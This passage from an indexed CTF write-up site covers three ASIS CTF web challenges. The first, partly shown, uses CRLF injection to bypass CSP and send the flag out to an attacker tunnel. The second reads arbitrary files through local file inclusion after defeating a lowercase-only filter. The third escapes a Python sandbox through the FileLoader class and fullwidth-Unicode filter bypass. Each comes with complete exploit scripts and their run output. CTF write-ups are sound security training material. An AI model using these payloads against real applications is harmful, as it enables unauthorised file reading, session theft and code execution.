Image().src=T+\"/c?m=\"+encodeURIComponent(m);}}\nP(\"1\");\n\n// Open popup window\nvar p=window.open(\"about:blank\",\"x\");\nP(p?\"2\":\"2F\");\n\n// Create login form for our CRLF user\nvar f=document.createElement(\"form\");\nf.method=\"POST\";\nf.action=\"{INTERNAL_ORIGIN}/login\";\nf.target=\"x\";\n\nvar u=document.createElement(\"textarea\");\nu.name=\"username\";\nu.value=atob(\"{b64_user}\");\n\nvar w=document.createElement(\"input\");\nw.name=\"password\";\nw.value=\"{PASSWORD}\";\n\nf.appendChild(u);\nf.appendChild(w);\ndocument.body.appendChild(f);\nf.submit();\nP(\"3\");\n\n// Navigate popup to /dashboard (triggers CRLF injection)\nsetTimeout(function(){{\n    P(\"4\");\n    if(p) p.location=\"{INTERNAL_ORIGIN}/dashboard\";\n}}, 2000);\n&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\"\"\"\n\n            self.send_response(200)\n            self.send_header(\"Content-Type\", \"text/html\")\n            self.end_headers()\n            self.wfile.write(html.encode())\n            print(\"[+] Served exploit.html\")\n            return\n\n        self.send_response(200)\n        self.end_headers()\n\n\ndef main():\n    # Step 1: Register our CRLF-injected user\n    print(\"[1] Registering CRLF user...\")\n    r = requests.post(f\"{TARGET_URL}/register\",\n                      data={\"username\": MALICIOUS_USERNAME, \"password\": PASSWORD},\n                      timeout=10)\n    print(f\"    Status: {r.status_code}\")\n\n    # Step 2: Verify injection works\n    print(\"[2] Verifying injection...\")\n    s = requests.Session()\n    s.post(f\"{TARGET_URL}/login\",\n           data={\"username\": MALICIOUS_USERNAME, \"password\": PASSWORD},\n           timeout=10)\n    r = s.get(f\"{TARGET_URL}/dashboard\", timeout=10)\n\n    if \"&lt;script&gt;\" in r.text:\n        print(\"    [+] CRLF injection verified!\")\n    else:\n        print(\"    [-] Injection failed!\")\n        return\n\n    # Step 3: Start exploit server\n    print(\"[3] Starting server...\")\n    server = socketserver.TCPServer((\"0.0.0.0\", LOCAL_PORT), Handler)\n    server.allow_reuse_address = True\n    threading.Thread(target=server.serve_forever, daemon=True).start()\n\n    # Step 4: Trigger bot\n    print(\"[4] Triggering bot...\")\n    r = requests.post(f\"{TARGET_URL}/report\",\n                      data={\"url\": f\"{TUNNEL_URL}/exploit.html\"},\n                      timeout=15)\n    print(f\"    Status: {r.status_code}\")\n\n    print(\"\\n[*] Waiting for flag... (expect W:FLAG after ~10s)\\n\")\n\n    while True:\n        time.sleep(1)\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"asis-ctf/bookmarks/#running-the-exploit","title":"Running the Exploit","text":"<ol> <li> <p>Start a tunnel (cloudflared is most reliable):    <pre><code>./cloudflared tunnel --url http://localhost:8000\n</code></pre></p> </li> <li> <p>Update <code>TUNNEL_URL</code> in the script with your tunnel URL</p> </li> <li> <p>Run the exploit:    <pre><code>python3 exploit.py\n</code></pre></p> </li> <li> <p>Watch for the flag:    <pre><code>[&gt;] 1\n[&gt;] 2\n[&gt;] 3\n[&gt;] 4\n[&gt;] A\n[&gt;] B\n[&gt;] F\n[&gt;] H\n[&gt;] W:FLAG{...}\n</code></pre></p> </li> </ol>"},{"location":"asis-ctf/bookmarks/#summary","title":"Summary","text":"Step Technique 1 CRLF injection in username to bypass CSP 2 HTTP Response Splitting pushes CSP header into body 3 Inject <code>&lt;script&gt;</code> tag that executes (no CSP enforcement) 4 Exploit shared session cookies between windows 5 <code>fetch(\"/dashboard\")</code> after bot logs in to steal flag"},{"location":"asis-ctf/bookmarks/#key-takeaways","title":"Key Takeaways","text":"<ol> <li>CRLF injection can completely bypass CSP by pushing security headers into the response body</li> <li>Same-origin windows share cookies - even if you can't read <code>window.opener.document</code>, you can still make authenticated requests</li> <li>Timing is critical - the script must wait for the bot to log in before fetching</li> <li>When <code>window.opener</code> access fails with <code>SecurityError</code>, consider alternative approaches like <code>fetch()</code> with shared cookies</li> </ol>"},{"location":"asis-ctf/bookmarks/#flag","title":"Flag","text":"<pre><code>FLAG{...}\n</code></pre>"},{"location":"asis-ctf/rick-gallery/","title":"Rick Gallery - CTF Web Challenge Writeup","text":""},{"location":"asis-ctf/rick-gallery/#challenge-overview","title":"Challenge Overview","text":"<p>Challenge Name: Rick Gallery Category: Web Description: A Rick &amp; Morty themed image gallery with a hidden vulnerability</p>"},{"location":"asis-ctf/rick-gallery/#initial-analysis","title":"Initial Analysis","text":"<p>We're given the source code of a PHP web application consisting of: - <code>index.php</code> - Main gallery page - <code>getpic.php</code> - Internal image fetcher (localhost only) - <code>.htaccess</code> - Restricts direct access to getpic.php - <code>Dockerfile</code> - Container configuration</p>"},{"location":"asis-ctf/rick-gallery/#source-code-review","title":"Source Code Review","text":"<p>index.php - Key vulnerability: <pre><code>if ($_SERVER[\"REQUEST_METHOD\"] === \"POST\") {\n    $headers = getallheaders();\n    if (!empty($headers[\"Image\"])) {\n        $raw = $headers[\"Image\"];\n\n        // FILTER: Blocked protocols (ALL LOWERCASE!)\n        $blockedProtocols = [\n            \"http://\", \"https://\", \"ftp://\", \"ftps://\",\n            \"file://\", \"data://\", \"expect://\", \"php://\",\n            \"passwd\"\n        ];\n\n        foreach ($blockedProtocols as $proto) {\n            if (strpos($raw, $proto) !== false) {\n                $raw = \"\";\n                break;\n            }\n        }\n\n        // FILTER: Path traversal\n        if (str_contains($raw, \"../\") || str_contains($raw, \"..\\\\\")) {\n            $raw = \"\";\n        }\n        // ... passes $raw to internal curl request\n    }\n}\n\n// Internal request to getpic.php\n$ch = curl_init(\"http://localhost:80/getpic.php\");\ncurl_setopt($ch, CURLOPT_POST, true);\ncurl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([\"picture_name\" =&gt; $selected]));\n</code></pre></p> <p>getpic.php - The actual file reader: <pre><code>$data = file_get_contents($_POST['picture_name']);\necho base64_encode(\"$data\");\n</code></pre></p>"},{"location":"asis-ctf/rick-gallery/#vulnerability-identification","title":"Vulnerability Identification","text":""},{"location":"asis-ctf/rick-gallery/#1-case-sensitive-filter-bypass","title":"1. Case-Sensitive Filter Bypass","text":"<p>The filter blocks lowercase protocol wrappers: - <code>php://</code>, <code>http://</code>, <code>file://</code>, <code>data://</code>, etc.</p> <p>Critical Discovery: PHP stream wrappers are case-insensitive!</p> <ul> <li>\u274c Blocked: <code>php://</code>, <code>file://</code>, <code>http://</code></li> <li>\u2705 Bypass: <code>PHP://</code>, <code>FILE://</code>, <code>HTTP://</code></li> </ul>"},{"location":"asis-ctf/rick-gallery/#2-local-file-inclusion-lfi","title":"2. Local File Inclusion (LFI)","text":"<p>Since <code>getpic.php</code> uses <code>file_get_contents()</code> on user-controlled input, and we can bypass the filter, we have arbitrary file read capability.</p>"},{"location":"asis-ctf/rick-gallery/#exploitation","title":"Exploitation","text":""},{"location":"asis-ctf/rick-gallery/#step-1-verify-lfi-works","title":"Step 1: Verify LFI Works","text":"<pre><code>import requests\nimport base64\n\nTARGET = \"http://65.109.194.105:8080/index.php\"\n\ndef read_file(path):\n    headers = {\"Image\": path}\n    r = requests.post(TARGET, headers=headers)\n    if '&lt;br /&gt;' in r.text or 'Warning' in r.text:\n        return None  # File doesn't exist\n    return base64.b64decode(r.text.strip())\n\n# Test with absolute path (no wrapper needed)\nprint(read_file(\"/etc/hostname\"))\n# Output: b'7be458eda235\\n'\n</code></pre> <p>\u2705 LFI confirmed!</p>"},{"location":"asis-ctf/rick-gallery/#step-2-enumerate-system-files","title":"Step 2: Enumerate System Files","text":"<p>We searched numerous locations for the flag: - <code>/flag.txt</code> - Not found - <code>/etc/passwd</code> - Blocked by filter (contains \"passwd\") - <code>/proc/self/environ</code> - Found, but no flag reference - <code>/var/log/apache2/error.log</code> - No flag info - Various config files and logs</p>"},{"location":"asis-ctf/rick-gallery/#step-3-finding-the-flag","title":"Step 3: Finding the Flag","text":"<p>After extensive enumeration, the flag was found at:</p> <pre><code>content = read_file(\"/tmp/flag.txt\")\nprint(content.decode())\n# ASIS{...}\n</code></pre>"},{"location":"asis-ctf/rick-gallery/#final-exploit-script","title":"Final Exploit Script","text":"<pre><code>#!/usr/bin/env python3\nimport requests\nimport base64\nimport sys\n\ndef read_file(target, path):\n    \"\"\"Read a file via LFI vulnerability.\"\"\"\n    if not target.endswith('.php'):\n        target = target.rstrip('/') + '/index.php'\n\n    headers = {\"Image\": path}\n    r = requests.post(target, headers=headers, timeout=10)\n\n    # Check for error response\n    if '&lt;br /&gt;' in r.text or 'Warning' in r.text:\n        return None\n\n    try:\n        decoded = base64.b64decode(r.text.strip())\n        if b'Warning' in decoded:\n            return None\n        return decoded\n    except:\n        return None\n\ndef main():\n    target = sys.argv[1] if len(sys.argv) &gt; 1 else \"http://target:8080/\"\n\n    # Read the flag\n    flag = read_file(target, \"/tmp/flag.txt\")\n\n    if flag:\n        print(f\"[+] FLAG: {flag.decode()}\")\n    else:\n        print(\"[-] Flag not found at /tmp/flag.txt\")\n\n        # Try alternative locations\n        alternatives = [\n            \"/flag.txt\",\n            \"/flag\",\n            \"/home/flag.txt\",\n            \"/var/www/flag.txt\",\n            \"/root/flag.txt\",\n        ]\n\n        for path in alternatives:\n            content = read_file(target, path)\n            if content:\n                print(f\"[+] Found at {path}: {content.decode()}\")\n                break\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"asis-ctf/rick-gallery/#key-takeaways","title":"Key Takeaways","text":""},{"location":"asis-ctf/rick-gallery/#1-case-sensitivity-matters","title":"1. Case-Sensitivity Matters","text":"<p>PHP stream wrappers (<code>php://</code>, <code>file://</code>, <code>http://</code>, etc.) are case-insensitive. Filters that only block lowercase versions can be bypassed with uppercase variants.</p>"},{"location":"asis-ctf/rick-gallery/#2-file_get_contents-is-dangerous","title":"2. file_get_contents() is Dangerous","text":"<p>When user input is passed to <code>file_get_contents()</code>, it creates an LFI vulnerability that can read arbitrary files on the system.</p>"},{"location":"asis-ctf/rick-gallery/#3-always-check-common-locations","title":"3. Always Check Common Locations","text":"<p>Don't overlook simple paths like <code>/tmp/</code>. CTF flags are often placed in: - <code>/tmp/flag.txt</code> - <code>/flag.txt</code> - <code>/flag</code> - <code>/home/*/flag.txt</code> - Environment variables (<code>/proc/self/environ</code>)</p>"},{"location":"asis-ctf/rick-gallery/#4-error-based-detection","title":"4. Error-Based Detection","text":"<p>By checking if the response contains HTML error messages (<code>&lt;br /&gt;</code>, <code>Warning</code>), we can determine if a file exists or not - useful for blind enumeration.</p>"},{"location":"asis-ctf/rick-gallery/#tools-techniques-used","title":"Tools &amp; Techniques Used","text":"<ol> <li>Source Code Analysis - Understanding the filter logic</li> <li>Protocol Wrapper Bypass - Case-insensitive wrapper abuse</li> <li>LFI Exploitation - Reading arbitrary files</li> <li>Systematic Enumeration - Checking multiple file locations</li> <li>Error-Based Oracle - Detecting file existence via error messages</li> </ol>"},{"location":"asis-ctf/rick-gallery/#references","title":"References","text":"<ul> <li>PHP Stream Wrappers</li> <li>HackTricks - File Inclusion</li> <li>PayloadsAllTheThings - File Inclusion</li> </ul>"},{"location":"asis-ctf/rick-gallery/#flag","title":"Flag","text":"<pre><code>ASIS{...}\n</code></pre>"},{"location":"asis-ctf/sanchess/","title":"Sanchess CTF Challenge Writeup","text":""},{"location":"asis-ctf/sanchess/#challenge-information","title":"Challenge Information","text":"<ul> <li>Name: Sanchess</li> <li>Category: Web Exploitation</li> <li>Flag: <code>ASIS{y0u_M2D3_r!cK_@NGRY}</code></li> </ul>"},{"location":"asis-ctf/sanchess/#challenge-description","title":"Challenge Description","text":"<p>Guide Rick through the shadows to discover Morty, armed only with peculiar tools.</p> <p>The challenge presents a Rick and Morty themed chess-like game where you can program moves for Rick to reach Morty on an 8x8 board.</p>"},{"location":"asis-ctf/sanchess/#initial-analysis","title":"Initial Analysis","text":""},{"location":"asis-ctf/sanchess/#the-web-interface","title":"The Web Interface","text":"<p>The application is a Flask/Werkzeug Python web app that provides: - An 8x8 chess-like board with Rick and Morty pieces - A move builder supporting two types of moves:   1. Simple moves: <code>up</code>, <code>down</code>, <code>left</code>, <code>right</code>   2. Conditional moves: Execute different directions based on conditions</p>"},{"location":"asis-ctf/sanchess/#key-endpoints","title":"Key Endpoints","text":"<ul> <li><code>GET /</code> - Main game interface</li> <li><code>POST /simulate</code> - Process moves and return Rick's path</li> <li><code>GET /quote</code> - Returns random Rick quotes</li> </ul>"},{"location":"asis-ctf/sanchess/#move-structure","title":"Move Structure","text":"<pre><code>// Simple move\n{\"type\": \"simple\", \"direction\": \"up\"}\n\n// Conditional move\n{\n  \"type\": \"conditional\",\n  \"condition\": {\n    \"type\": \"distance\",  // or \"cell_color\"\n    \"op\": \"&gt;\",           // comparison operator\n    \"value\": 5           // value to compare against\n  },\n  \"then\": \"down\",\n  \"else\": \"up\"\n}\n</code></pre>"},{"location":"asis-ctf/sanchess/#vulnerability-discovery","title":"Vulnerability Discovery","text":""},{"location":"asis-ctf/sanchess/#step-1-testing-input-fields","title":"Step 1: Testing Input Fields","text":"<p>I tested various injection payloads in different fields of the <code>/simulate</code> endpoint.</p> <p>Key Finding: The <code>value</code> field in distance conditions accepts string expressions that get evaluated!</p> <pre><code># Testing expression evaluation\n{\"type\": \"distance\", \"op\": \"&gt;\", \"value\": \"1+1\"}      # Works! Evaluates to 2\n{\"type\": \"distance\", \"op\": \"&gt;\", \"value\": \"len('hello')\"}  # Works! Evaluates to 5\n</code></pre>"},{"location":"asis-ctf/sanchess/#step-2-confirming-code-execution","title":"Step 2: Confirming Code Execution","text":"<p>I mapped out which Python functions were allowed:</p> Function Status <code>len()</code> \u2705 Allowed <code>str()</code> \u2705 Allowed <code>chr()</code> \u2705 Allowed <code>int()</code> \u2705 Allowed <code>getattr()</code> \u2705 Allowed <code>ord()</code> \u274c Blocked directly <code>open()</code> \u274c Blocked directly <code>eval()</code> \u274c Blocked <code>__import__()</code> \u274c Blocked"},{"location":"asis-ctf/sanchess/#step-3-finding-file-access-via-python-class-hierarchy","title":"Step 3: Finding File Access via Python Class Hierarchy","text":"<p>Since <code>open()</code> was blocked directly, I used Python's class hierarchy to find an alternative file access method.</p> <p>The breakthrough: <code>FileLoader</code> class from Python's import system!</p> <pre><code># Access FileLoader through object subclasses\n[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='FileLoader'][0]\n\n# Read file using FileLoader.get_data()\n[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='FileLoader'][0]('flag.txt','flag.txt').get_data('flag.txt')\n</code></pre> <p>Testing this worked: <pre><code># Expression to get length of flag.txt\n\"len([c for c in ().__class__.__base__.__subclasses__() if c.__name__=='FileLoader'][0]('flag.txt','flag.txt').get_data('flag.txt'))\"\n</code></pre></p>"},{"location":"asis-ctf/sanchess/#exploitation-version-1-pre-patch","title":"Exploitation (Version 1 - Pre-Patch)","text":""},{"location":"asis-ctf/sanchess/#the-boolean-oracle","title":"The Boolean Oracle","text":"<p>The challenge uses Manhattan distance calculation between Rick and Morty positions. With Rick at (0,0) and Morty at (7,1), the distance is 8.</p> <p>Exploitation Logic: - If <code>distance &gt; expression_result</code> \u2192 Rick moves DOWN (condition TRUE) - If <code>distance &lt;= expression_result</code> \u2192 Rick moves UP (condition FALSE)</p> <p>By observing Rick's movement, we can determine if our expression evaluated to a value less than 8 (TRUE) or &gt;= 8 (FALSE).</p>"},{"location":"asis-ctf/sanchess/#blind-character-extraction","title":"Blind Character Extraction","text":"<p>To extract flag characters, I used this technique:</p> <pre><code># Expression: (flag[pos] == char_code) * 100\n# If match: 1 * 100 = 100, and 8 &gt; 100 = FALSE\n# If no match: 0 * 100 = 0, and 8 &gt; 0 = TRUE\n\nbyte_expr = \"[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='FileLoader'][0]('flag.txt','flag.txt').get_data('flag.txt')\"\ntest_expr = f\"({byte_expr}[{position}]=={ascii_code})*100\"\n</code></pre> <p>Oracle interpretation: - Response shows Rick moving DOWN (TRUE) \u2192 Character does NOT match - Response shows Rick moving UP (FALSE) \u2192 Character MATCHES! \u2713</p>"},{"location":"asis-ctf/sanchess/#pre-patch-exploit-script","title":"Pre-Patch Exploit Script","text":"<pre><code>#!/usr/bin/env python3\n\"\"\"\nSanchess CTF - Flag Extraction Exploit (Pre-Patch Version)\nUses FileLoader class to read flag.txt\n\"\"\"\n\nimport requests\nimport string\nimport time\n\nBASE_URL = \"http://65.109.194.105:9090\"\nSESSION = requests.Session()\n\ndef test_expr(expr, distance=8):\n    \"\"\"Test if distance &gt; expr\"\"\"\n    morty_row = min(distance, 7)\n    morty_col = max(0, distance - 7)\n\n    payload = {\n        \"rick\": {\"row\": 0, \"col\": 0},\n        \"morty\": {\"row\": morty_row, \"col\": morty_col},\n        \"moves\": [{\n            \"type\": \"conditional\",\n            \"condition\": {\"type\": \"distance\", \"op\": \"&gt;\", \"value\": expr},\n            \"then\": \"down\",\n            \"else\": \"up\"\n        }]\n    }\n\n    try:\n        r = SESSION.post(f\"{BASE_URL}/simulate\", json=payload, timeout=10)\n        data = r.json()\n        if \"Error\" in data:\n            return None\n        path = data.get(\"path\", [])\n        if len(path) &gt;= 2:\n            return path[1][\"row\"] &gt; path[0][\"row\"]\n        return None\n    except:\n        return None\n\ndef check_char(pos, char_code):\n    \"\"\"\n    Check if flag[pos] == char_code\n    Returns True if MATCH, False if no match\n    \"\"\"\n    byte_expr = \"[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='FileLoader'][0]('flag.txt','flag.txt').get_data('flag.txt')\"\n    expr = f\"({byte_expr}[{pos}]=={char_code})*100\"\n    result = test_expr(expr)\n\n    if result is None:\n        return None\n    # False means match (8 &gt; 100 is False)\n    return result == False\n\ndef extract_flag():\n    \"\"\"Extract the complete flag\"\"\"\n    charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + \"_{}-!@#$%^&amp;*().\"\n    flag = \"\"\n\n    print(\"[*] Extracting flag...\")\n\n    for pos in range(100):\n        found = False\n        for char in charset:\n            if check_char(pos, ord(char)):\n                flag += char\n                print(f\"    [{pos}] '{char}' -&gt; {flag}\")\n                found = True\n                break\n            time.sleep(0.02)\n\n        if not found:\n            print(f\"    [{pos}] No match found - END\")\n            break\n\n        if char == '}':\n            print(\"\\n[+] Flag complete!\")\n            break\n\n    return flag\n\nif __name__ == \"__main__\":\n    print(\"=\" * 60)\n    print(\"Sanchess CTF - Flag Extraction\")\n    print(\"=\" * 60)\n\n    # Verify method works\n    print(\"\\n[*] Verifying extraction method...\")\n    print(f\"    flag[0] == 'A': {check_char(0, 65)}\")  # Should be True\n    print(f\"    flag[0] == 'B': {check_char(0, 66)}\")  # Should be False\n\n    # Extract flag\n    flag = extract_flag()\n\n    print(\"\\n\" + \"=\" * 60)\n    print(f\"FLAG: {flag}\")\n    print(\"=\" * 60)\n</code></pre>"},{"location":"asis-ctf/sanchess/#exploitation-version-2-post-patch-with-unicode-normalization-bypass","title":"Exploitation (Version 2 - Post-Patch with Unicode Normalization Bypass)","text":"<p>After the initial exploit was discovered, the challenge was patched to block keywords like <code>open</code>, <code>read</code>, <code>flag</code>, etc. However, the filter could be bypassed using Unicode Normalization.</p>"},{"location":"asis-ctf/sanchess/#the-unicode-normalization-bypass","title":"The Unicode Normalization Bypass","text":"<p>Python (and many web frameworks) normalize Unicode characters before processing. This means Fullwidth Unicode characters (U+FF01 to U+FF5E) get normalized to their ASCII equivalents.</p> <p>For example: - <code>\uff4f\uff50\uff45\uff4e</code> (Fullwidth) \u2192 <code>open</code> (ASCII) after normalization - <code>\uff52\uff45\uff41\uff44</code> (Fullwidth) \u2192 <code>read</code> (ASCII) after normalization</p> <p>The filter checks for blocked keywords before normalization, but Python evaluates the expression after normalization!</p>"},{"location":"asis-ctf/sanchess/#conversion-function","title":"Conversion Function","text":"<pre><code>def to_fullwidth(s):\n    \"\"\"\n    Converts ASCII characters to their Fullwidth Unicode equivalents.\n    This bypasses filters that look for \"open\", \"eval\", \"_\", etc.\n    \"\"\"\n    res = \"\"\n    for char in s:\n        code = ord(char)\n        # Shift ASCII to Fullwidth (Offset 0xFEE0)\n        # Range: ! (33) to ~ (126)\n        if 33 &lt;= code &lt;= 126:\n            res += chr(code + 0xFEE0)\n        else:\n            res += char\n    return res\n\n# Examples:\n# to_fullwidth(\"open\") -&gt; \"\uff4f\uff50\uff45\uff4e\"\n# to_fullwidth(\"read\") -&gt; \"\uff52\uff45\uff41\uff44\"\n</code></pre>"},{"location":"asis-ctf/sanchess/#post-patch-exploit-payload","title":"Post-Patch Exploit Payload","text":"<pre><code># Fullwidth function names bypass the filter\nfunc_open = to_fullwidth(\"open\")   # \uff4f\uff50\uff45\uff4e\nfunc_read = to_fullwidth(\"read\")   # \uff52\uff45\uff41\uff44\n\n# Filename can use string concatenation to bypass \"flag\" filter\nfname = \"'fl'+'ag.txt'\"\n\n# Final payload: \uff4f\uff50\uff45\uff4e('fl'+'ag.txt').\uff52\uff45\uff41\uff44()[pos] == 'char'\npayload = f\"{func_open}({fname}).{func_read}()[{pos}] == '{char}'\"\n</code></pre>"},{"location":"asis-ctf/sanchess/#post-patch-exploit-script","title":"Post-Patch Exploit Script","text":"<pre><code>#!/usr/bin/env python3\n\"\"\"\nSanchess CTF - Flag Extraction Exploit (Post-Patch Version)\nUses Unicode Normalization Bypass to evade keyword filters\n\"\"\"\n\nimport requests\nimport sys\n\nBASE_URL = \"http://65.109.194.105:9090/\"\nSESSION = requests.Session()\n\ndef to_fullwidth(s):\n    \"\"\"\n    Converts ASCII characters to their Fullwidth Unicode equivalents.\n    This bypasses filters that look for \"open\", \"eval\", \"_\", etc.\n    \"\"\"\n    res = \"\"\n    for char in s:\n        code = ord(char)\n        # Shift ASCII to Fullwidth (Offset 0xFEE0)\n        # Range: ! (33) to ~ (126)\n        if 33 &lt;= code &lt;= 126:\n            res += chr(code + 0xFEE0)\n        else:\n            res += char\n    return res\n\ndef send_move(payload_expr):\n    \"\"\"\n    Sends the payload to the server.\n\n    Logic:\n    - Match found -&gt; Return 100 -&gt; Distance (8) &gt; 100 is False -&gt; Move UP\n    - No Match    -&gt; Return 0   -&gt; Distance (8) &gt; 0 is True   -&gt; Move DOWN\n    \"\"\"\n    final_payload = f\"({payload_expr}) * 100\"\n\n    json_body = {\n        \"rick\": {\"row\": 0, \"col\": 0},\n        \"morty\": {\"row\": 7, \"col\": 1},\n        \"moves\": [{\n            \"type\": \"conditional\",\n            \"condition\": {\"type\": \"distance\", \"op\": \"&gt;\", \"value\": final_payload},\n            \"then\": \"down\",\n            \"else\": \"up\"\n        }]\n    }\n\n    try:\n        r = SESSION.post(f\"{BASE_URL}/simulate\", json=json_body, timeout=5)\n        if r.status_code != 200:\n            return None\n        data = r.json()\n        if \"error\" in data or not data.get(\"path\"):\n            return None\n\n        path = data[\"path\"]\n        if len(path) &lt; 2:\n            return None\n\n        # UP (Row stays 0) = MATCH\n        if path[1]['row'] == 0:\n            return True\n        else:\n            return False\n    except Exception:\n        return None\n\ndef brute_force_flag():\n    print(\"[*] Starting Unicode Normalization Bypass...\")\n\n    # Construct the payload elements\n    # Function names MUST be Fullwidth to bypass filters\n    # String literals (filenames) MUST be ASCII to match the filesystem\n    func_open = to_fullwidth(\"open\")   # \uff4f\uff50\uff45\uff4e\n    func_read = to_fullwidth(\"read\")   # \uff52\uff45\uff41\uff44\n\n    # Filename with string concatenation to bypass \"flag\" filter\n    fname = \"'fl'+'ag.txt'\"\n\n    print(f\"[*] Payload Template: {func_open}({fname}).{func_read}()[pos]\")\n\n    flag = \"\"\n    charset = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!?\"\n\n    for pos in range(0, 50):\n        found = False\n        sys.stdout.write(f\"\\r[{pos}] \")\n\n        for char in charset:\n            # Escape quotes in the comparison character\n            safe_char = char\n            if char == \"'\":\n                safe_char = \"\\\\'\"\n\n            # Construct the injection payload\n            # \"\uff4f\uff50\uff45\uff4e('fl'+'ag.txt').\uff52\uff45\uff41\uff44()[pos] == 'c'\"\n            expr = f\"{func_open}({fname}).{func_read}()[{pos}] == '{safe_char}'\"\n\n            res = send_move(expr)\n\n            if res is True:\n                flag += char\n                print(f\"\\r[+] Flag: {flag}                 \")\n                found = True\n                break\n\n        if not found:\n            print(f\"\\n[!] Stalled at position {pos}. End of flag?\")\n            break\n\n    print(f\"\\nFinal Flag: {flag}\")\n\nif __name__ == \"__main__\":\n    brute_force_flag()\n</code></pre>"},{"location":"asis-ctf/sanchess/#running-the-post-patch-exploit","title":"Running the Post-Patch Exploit","text":"<pre><code>$ python3 exploit_v2.py\n[*] Starting Unicode Normalization Bypass...\n[*] Payload Template: \uff4f\uff50\uff45\uff4e('fl'+'ag.txt').\uff52\uff45\uff41\uff44()[pos]\n[+] Flag: A\n[+] Flag: AS\n[+] Flag: ASI\n[+] Flag: ASIS\n[+] Flag: ASIS{\n[+] Flag: ASIS{y\n[+] Flag: ASIS{y0\n[+] Flag: ASIS{y0u\n[+] Flag: ASIS{y0u_\n[+] Flag: ASIS{y0u_M\n[+] Flag: ASIS{y0u_M2\n[+] Flag: ASIS{y0u_M2D\n[+] Flag: ASIS{y0u_M2D3\n[+] Flag: ASIS{y0u_M2D3_\n[+] Flag: ASIS{y0u_M2D3_r\n[+] Flag: ASIS{y0u_M2D3_r!\n[+] Flag: ASIS{y0u_M2D3_r!c\n[+] Flag: ASIS{y0u_M2D3_r!cK\n[+] Flag: ASIS{y0u_M2D3_r!cK_\n[+] Flag: ASIS{y0u_M2D3_r!cK_@\n[+] Flag: ASIS{y0u_M2D3_r!cK_@N\n[+] Flag: ASIS{y0u_M2D3_r!cK_@NG\n[+] Flag: ASIS{y0u_M2D3_r!cK_@NGR\n[+] Flag: ASIS{y0u_M2D3_r!cK_@NGRY\n[+] Flag: ASIS{y0u_M2D3_r!cK_@NGRY}\n\nFinal Flag: ASIS{y0u_M2D3_r!cK_@NGRY}\n</code></pre>"},{"location":"asis-ctf/sanchess/#flag","title":"Flag","text":"<p><pre><code>ASIS{y0u_M2D3_r!cK_@NGRY}\n</code></pre> (Translates to: \"you made Rick angry\")</p>"},{"location":"asis-ctf/sanchess/#summary-of-techniques-used","title":"Summary of Techniques Used","text":"Version Technique Bypass Method Pre-Patch Python Class Hierarchy <code>FileLoader.get_data()</code> via <code>().__class__.__base__.__subclasses__()</code> Post-Patch Unicode Normalization Fullwidth characters <code>\uff4f\uff50\uff45\uff4e</code> \u2192 <code>open</code> after normalization"},{"location":"asis-ctf/sanchess/#key-takeaways","title":"Key Takeaways","text":"<ol> <li> <p>Python Sandbox Escapes: Even when common dangerous functions like <code>open()</code>, <code>eval()</code>, and <code>__import__()</code> are blocked, Python's rich class hierarchy often provides alternative paths to achieve the same goal.</p> </li> <li> <p>FileLoader Technique: The <code>importlib</code> module's <code>FileLoader</code> class has a <code>get_data()</code> method that can read arbitrary files - a common sandbox escape technique.</p> </li> <li> <p>Unicode Normalization Bypass: Many applications normalize Unicode input, which can be exploited to bypass keyword-based filters. Fullwidth characters (U+FF01-U+FF5E) normalize to ASCII equivalents.</p> </li> <li> <p>Boolean-Based Blind Extraction: When direct output isn't available, boolean conditions (like movement direction) can be used as an oracle to extract data character by character.</p> </li> <li> <p>String Concatenation: Filters blocking specific strings like <code>\"flag\"</code> can often be bypassed with concatenation: <code>'fl'+'ag.txt'</code></p> </li> <li> <p>The Hint: \"armed only with peculiar tools\" referred to the conditional move system being the exploitation vector.</p> </li> </ol>"},{"location":"asis-ctf/sanchess/#references","title":"References","text":"<ul> <li>Python Sandbox Escape Techniques</li> <li>SSTI Payloads</li> <li>Unicode Normalization Attacks</li> <li>Fullwidth Unicode Characters</li> </ul>"}]}